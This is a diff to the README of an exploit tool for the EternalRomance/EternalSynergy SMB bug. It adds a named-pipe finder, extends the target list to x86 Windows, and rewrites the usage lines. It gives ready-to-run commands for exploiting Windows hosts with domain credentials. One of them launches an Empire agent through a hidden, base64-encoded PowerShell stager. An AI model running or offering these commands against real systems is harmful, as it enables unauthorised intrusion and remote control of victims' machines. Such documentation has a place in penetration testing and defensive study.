@@ -32,27 +32,31 @@ Example for spawning a meterpreter session on an x64 machine:
 
 ## Eternalsynergy - Eternalromance
 
-This exploit exploits the same bug used by NSA's Eternalromance and Eternalsynergy. A named pipe is needed, meaning on more modern (default) configurations you will need credentials in order for the exploit to work. In most cases, domain user credentials will suffice. 
+This exploit exploits the same bug used by NSA's Eternalromance and Eternalsynergy. A named pipe is needed, meaning on more modern (default) configurations you will need credentials in order for the exploit to work. In most cases, domain user credentials will suffice. You can use `find_named_pipe.py` to find available named pipes on the target.
 
 ### Compatible targets
-
-x64 architecture only
 
 - Windows 2016 x64
 - Windows 2012 R2 x64
 - Windows 8.1 x64
 - Windows 2008 R2 SP1 x64
 - Windows 7 SP1 x64
+- Windows 8.1 x86
+- Windows 7 SP1 x86
 
 ### Usage
 
-Usage: 
+Example for finding a named pipe:
 
-`python eternalsynergy_romance.py <target_ip_address> <named_pipe> <DOMAIN\username> <password> <command_to_execute>`
+`python find_named_pip.py 192.168.178.26 testuser Password123`
+
+Usage of `eternalsynergy_romance.py`: 
+
+`python eternalsynergy_romance.py <target_ip_address> <named_pipe> <username> <password> <command_to_execute>`
 
 Example for spawning an Empire agent:
 
-`python eternalsynergy_romance.py 192.168.178.2 netlogon WORKGROUP\testuser !Password123 "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAUwB0AEUAbQAuAE4AZQBUAC..."`
+`python eternalsynergy_romance.py 192.168.178.2 netlogon testuser !Password123 "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAUwB0AEUAbQAuAE4AZQBUAC..."`
 
 Example for spawning a meterpreter session:
 
